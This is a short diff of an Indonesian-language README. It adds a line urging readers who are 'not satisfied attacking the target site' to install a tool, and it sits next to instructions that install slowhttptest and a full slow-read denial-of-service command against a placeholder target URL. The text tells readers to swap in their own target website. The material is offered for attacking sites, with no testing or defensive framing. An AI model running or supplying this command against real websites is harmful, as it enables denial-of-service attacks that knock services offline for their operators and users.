@@ -34,6 +34,9 @@ sudo apt-get update -y
 sudo apt-get upgrade -y
 sudo apt install slowhttptest
 ```
+~~~
+Jika Kalian Kurang Puas untuk Menyerang situs Target kalian Bisa install Program ini ikuti langkah berikut..
+~~~
 # Salin & Tempel di notepad, lalu Ganti Website target kalian, jalankan perintah tersebut 
 ```
 slowhttptest -c 1000 -X -g -o slow_read_stats -o file_prefix -o my_body_stats -r 10 -w 9999999 -y 9999999 -i 99999 -n 5 -z 32  -k 10 -t FAKEVERB -t GET -u https://contoh-target.com -p 3
